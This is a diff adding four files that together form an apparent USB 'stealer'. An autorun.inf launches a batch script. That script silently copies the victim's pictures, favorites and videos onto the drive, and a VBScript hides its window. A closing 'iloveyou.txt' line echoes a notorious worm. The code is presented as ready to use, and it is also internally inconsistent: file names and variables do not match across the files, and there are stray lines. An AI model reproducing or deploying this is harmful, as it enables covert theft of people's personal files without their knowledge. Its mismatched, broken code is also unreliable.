@@ -1,0 +1,42 @@
+// its 4 files
+// first file name it autorun.inf
+// script for the file autorun.inf below vvvv
+[autorun]
+icon=drive.ico
+open=launch.bat
+action=Click OK to Run
+shell\open\command=launch.bat
+
+
+// second file 
+// name ths one file.bat
+// script for file.bat below vvvv
+@echo off 
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
+@echo off
+cls
+
+
+// third file
+// name this one invisible.vbs
+// script for invisible.vbs below vvvv
+CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+
+
+// fourth file
+// name this one lounch.bat
+// script for lounch.bat below
+wscript.exe \invisible.vbs file.bat
+
+
+
+
+//iloveyou.txt
+// love letter for you
